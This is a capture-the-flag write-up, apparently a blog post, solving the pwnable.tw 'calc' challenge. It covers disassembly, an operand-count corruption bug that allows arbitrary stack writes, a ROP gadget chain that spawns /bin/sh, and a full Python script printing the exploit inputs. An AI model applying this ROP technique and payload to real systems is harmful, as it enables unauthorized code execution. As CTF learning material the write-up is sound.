@@ -1,0 +1,235 @@
+I"D<p>It’s amazing how benign things in a binary can be exploited to gain complete control of the system. In this post I describe the details of solving challenge #3 (calc) on <a href="pwnable">www.pwnable.tw</a>. My previous <code class="language-plaintext highlighter-rouge">orw</code> challenge on the pwnable involved simple stack smashing to redirect code execution to the stack. This challenge however wasn’t that simple.</p>
+
+<h3 id="about-the-binary">About the binary</h3>
+<p>The binary file is called and can be downloaded from the site for experimenting on it. On running the binary:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./calc
+=== Welcome to SECPROG calculator ===
+8guk
+--&gt; 0
+8+8
+--&gt; 16
+hello
+--&gt; Merry Christmas!
+$
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">checksec</code> utility reveals that stack execution has been disabled using NX bit.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ checksec calc
+[*] '/home/hema/calc'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre></div></div>
+
+<p>It functions as a calulator and exits with ‘Merry Christmas’ on entering alphabets.</p>
+
+<p>Upon disassembly I observed the following program flow</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	*main* --&gt; *calc* --&gt; *get_expr*
+				  |-----&gt; *init_pool*
+				  |-----&gt; *parse_expr*-----&gt;*eval*
+</code></pre></div></div>
+<h3 id="initial-approach">Initial approach</h3>
+<p>My first approach was to try and write a large string to check if it causes a segmentation fault. But as I observed the disassembly, the input is accepted into a stack area character-by-character using a read call for 1 byte length. This is done until a newline character is entered. The characters are copied from here to another allocated stack area of considerable size (1024 bytes). There was no nearby return address which could be modified from this area.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Disassembly of get_expr:
+[ ... ]
+
+   0x08048e53 &lt;+15&gt;:	mov    DWORD PTR [esp+0x8],0x1 ; length set to accept single character
+   0x08048e5b &lt;+23&gt;:	lea    eax,[ebp-0xd]
+   0x08048e5e &lt;+26&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x08048e62 &lt;+30&gt;:	mov    DWORD PTR [esp],0x0		; accept from stdin
+   0x08048e69 &lt;+37&gt;:	call   0x806e6d0 &lt;read&gt;			; call to read function
+
+[ ... ]
+</code></pre></div></div>
+<p>In the <code class="language-plaintext highlighter-rouge">parse_expr</code> function I observed a <code class="language-plaintext highlighter-rouge">memcopy</code> function. I thought maybe this could be used to copy a lengthy operand to another area and corrupt the stack area. But this proved futile as the copy was done to to a heap area.</p>
+
+<h3 id="i-give-up">I give up</h3>
+<p>I felt frustrated and decided to see some write ups. The first step to solving it was try and create a SEGFAULT like below:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./calc
+=== Welcome to SECPROG calculator ===
++1000000
+--&gt; Segmentation fault (core dumped)
+</code></pre></div></div>
+<p>I ran the binary with gdb and saw the segfault occured in the <code class="language-plaintext highlighter-rouge">calc</code> at the below instruction</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x080493f6 &lt;+125&gt;:	mov    eax,DWORD PTR [ebp-0x5a0]
+   0x080493fc &lt;+131&gt;:	sub    eax,0x1
+   0x080493ff &lt;+134&gt;:	mov    eax,DWORD PTR [ebp+eax*4-0x59c] &lt;---- SEGFAULT here
+   0x08049406 &lt;+141&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x0804940a &lt;+145&gt;:	mov    DWORD PTR [esp],0x80bf804
+   0x08049411 &lt;+152&gt;:	call   0x804ff60 &lt;printf&gt;
+</code></pre></div></div>
+<p>It indicates that the offset provided by the value in <code class="language-plaintext highlighter-rouge">eax</code> register was causing the program to access an illegal area. This is to access the result of the calculation operation before invoking printf on it.</p>
+
+<p>At this point, I decide to use the python script solution mentioned in the writeup. But this did not work as there seems to issues with construction of the hack. But the article did point in the only possible direction to solve the challenge.
+The calculation operation happens in the <code class="language-plaintext highlighter-rouge">eval</code> function called inside <code class="language-plaintext highlighter-rouge">parse_expr</code>. Here is a part of the <code class="language-plaintext highlighter-rouge">eval</code> disassembly for the add operation.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ ... ]
+   0x08048f1a &lt;+57&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+   0x08048f1d &lt;+60&gt;:	mov    eax,DWORD PTR [eax]
+   0x08048f1f &lt;+62&gt;:	lea    edx,[eax-0x2]
+   0x08048f22 &lt;+65&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+   0x08048f25 &lt;+68&gt;:	mov    eax,DWORD PTR [eax]
+   0x08048f27 &lt;+70&gt;:	lea    ecx,[eax-0x2]
+   0x08048f2a &lt;+73&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+   0x08048f2d &lt;+76&gt;:	mov    ecx,DWORD PTR [eax+ecx*4+0x4]
+   0x08048f31 &lt;+80&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+   0x08048f34 &lt;+83&gt;:	mov    eax,DWORD PTR [eax]
+   0x08048f36 &lt;+85&gt;:	lea    ebx,[eax-0x1]
+   0x08048f39 &lt;+88&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+   0x08048f3c &lt;+91&gt;:	mov    eax,DWORD PTR [eax+ebx*4+0x4]
+   0x08048f40 &lt;+95&gt;:	add    ecx,eax		&lt;--------------------- The add operation
+   0x08048f42 &lt;+97&gt;:	mov    eax,DWORD PTR [ebp+0x8]
+   0x08048f45 &lt;+100&gt;:	mov    DWORD PTR [eax+edx*4+0x4],ecx
+[ ... ]   
+</code></pre></div></div>
+<p>When we try a simple add like 1+2, it is held on the stack like so:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffcb48:	0x00000002	0x00000001	0x00000002
+</code></pre></div></div>
+<p>The first word represents the number of operands, followed by the operands 1,2 themselves.</p>
+
+<p>At the end of the operation, the stack looks like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffcb48:	0x00000002	0x00000003	0x00000002
+</code></pre></div></div>
+<p>The result (0x3) is stored in place of the first operand and the index (0x2) is used later in <code class="language-plaintext highlighter-rouge">calc</code> to access this result.</p>
+
+<h3 id="the-hack">The Hack</h3>
+<p>But something peculiar happens when the input contains a single operand like +100, it is held on the stack like this</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffcb48:	0x00000001	0x00000064	0x00000000
+</code></pre></div></div>
+<p>By the end of the add operation and copying the result back to stack.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffcb48:	0x00000065	0x00000064  0x00000000
+</code></pre></div></div>
+<p>It has erroneously overwritten the word used to hold an index to the result. Now when this index is accessed in the <code class="language-plaintext highlighter-rouge">calc</code> function:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov eax,DWORD PTR [ebp+ eax*4 -0x59c]
+	BECOMES
+mov eax,DWORD PTR [ebp + 0x65*4-0x59c]
+	INSTEAD OF 
+mov eax,DWORD PTR [ebp+ 1*4 -0x59c]
+</code></pre></div></div>
+<p>When this causes out-of-range memory accesses, a SEGFAULT occurs.</p>
+
+<p>On repeating the expression with another operand like +100+10, two iterations of add occur in the <code class="language-plaintext highlighter-rouge">eval</code> function.</p>
+
+<p>On the first iteration, the index is corrupted</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffcb48:	0x00000065	0x00000064  0x00000000
+</code></pre></div></div>
+<p>On the second iteration</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>base = 0xffffcb48
+operand_1 = *(base + (0x65-2)*4 + 0x4)
+operand_2 = *(base + (0x65-1)*4 + 0x4) &lt;------ In this case value at this address is '10'
+result = operand_1 + operand_2
+*(base + (0x65-2)*4 + 0x4) = result
+</code></pre></div></div>
+<p>The result is stored into the location of operand_1.</p>
+
+<p>This feature of corrupting the index and using it to write into another area in the stack can be used to corrupt the return address in the main function.
+The return address for me was located at <code class="language-plaintext highlighter-rouge">0xffffd10c</code>
+Difference between the <code class="language-plaintext highlighter-rouge">base(0xffffcb48)</code> and <code class="language-plaintext highlighter-rouge">0xffffd10c</code> is <code class="language-plaintext highlighter-rouge">0x5c4</code> or <code class="language-plaintext highlighter-rouge">1476</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">(x-2)*4 + 4 = 1476</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">x = 370 or 0x172</code></p>
+
+<p>‘x’ is the index value.</p>
+
+<p>Our input must be <code class="language-plaintext highlighter-rouge">1</code> lower than this, making it <code class="language-plaintext highlighter-rouge">0x171</code> or <code class="language-plaintext highlighter-rouge">369</code>.</p>
+
+<p>Now operand_1 will be the return address held in the main function’s stack area and operand_2 is to be crafted to point the <code class="language-plaintext highlighter-rouge">result</code> value to address of executable areas in the program containing ROP gadgets. ROP gadgets are specific areas of the executable part of a program which can be used to execute custom instructions</p>
+
+<p>For example, if operand_1 is <code class="language-plaintext highlighter-rouge">0x0804967a</code> and operand_2 is <code class="language-plaintext highlighter-rouge">0x‭26B30‬ (158512)</code>, the result is <code class="language-plaintext highlighter-rouge">0x80701aa</code>‬ and instructions at this address are <code class="language-plaintext highlighter-rouge">pop edx; ret</code>. When this result overwrites the return address of <code class="language-plaintext highlighter-rouge">main</code>, it causes random code execution.</p>
+
+<p>It can be observed that following <code class="language-plaintext highlighter-rouge">pop edx</code> there is <code class="language-plaintext highlighter-rouge">ret</code>, which essentially causes the next value on the stack to be loaded into the program counter.
+The writeup gives the list instructions and their addresses in the executable section of the memory that leads to the creation of a shell process which we can use to read the flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ADDRESS	   # INSTRUCTION
+0x080701aa # pop edx ; ret
+0x080ec060 # @ .data
+0x0805c34b # pop eax ; ret
+0x6e69622f # 'bin'
+0x0809b30d # mov dword ptr [edx], eax ; ret
+0x080701aa # pop edx ; ret
+0x080ec064 # @ .data + 4
+0x0805c34b # pop eax ; ret
+0x68732f2f # '//sh'
+0x0809b30d # mov dword ptr [edx], eax ; ret
+0x080701aa # pop edx ; ret
+0x080ec068 # @ .data + 8
+0x080550d0 # xor eax, eax ; ret
+0x0809b30d # mov dword ptr [edx], eax ; ret
+0x080481d1 # pop ebx ; ret
+0x080ec060 # @ .data
+0x080701d1 # pop ecx ; pop ebx ; ret
+0x080ec068 # @ .data + 8
+0x080ec060 # padding without overwrite ebx
+0x080701aa # pop edx ; ret
+0x080ec068 # @ .data + 8
+0x080550d0 # xor eax, eax ; ret
+0x0807cb7f # inc eax ; ret
+0x0807cb7f # inc eax ; ret
+0x0807cb7f # inc eax ; ret
+0x0807cb7f # inc eax ; ret
+0x0807cb7f # inc eax ; ret
+0x0807cb7f # inc eax ; ret
+0x0807cb7f # inc eax ; ret
+0x0807cb7f # inc eax ; ret
+0x0807cb7f # inc eax ; ret
+0x0807cb7f # inc eax ; ret
+0x0807cb7f # inc eax ; ret
+0x08049a21 # int 0x80
+</code></pre></div></div>
+
+<p>So the input is of the following form</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>INDEX +/- OFFSET
+
+INDEX	---&gt; Used to point to word locations on stack starting from return address in main
+OFFSET	---&gt; Added/Subtracted to existing value on stack to result in address of executable code
+</code></pre></div></div>
+<h3 id="the-final-solution">The final solution</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="s">"+369+158512"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+370+135025968"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+371-430565"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+372+1851969610"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+373-1717116221"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+374-1582439315"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+375-1447254831"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+376-1312659428"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+377+439719755"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+378-304866366"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+379-170189460"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+380-35004972"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+381+99561124"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+382+35292265"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+383+99220840"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+384+35963640"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+385+98713305"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+386+36471183"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+387+98713297"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+388+35963609"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+389+99220879"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+390+35345217"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+391+99383358"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+392+35345217"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+393+99383358"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+394+35345217"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+395+99383358"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+396+35345217"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+397+99383358"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+398+35345217"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+399+99383358"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+400+35345217"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+401+99383358"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"+402+35135971"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"h"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>The last alphabet print triggers the exit of main function and starts arbitarty code execution.</p>
+
+<p>Phew, that was a lot to learn in one challenge. Try the challenge and let me know what you think.</p>
+
+<h4 id="references">References</h4>
+<ol>
+  <li><a href="http://phobosys.de/blog_january_20.html">The first solution..well almost</a></li>
+  <li><a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a></li>
+  <li><a href="https://github.com/slimm609/checksec.sh">checksec</a></li>
+</ol>
+:ET
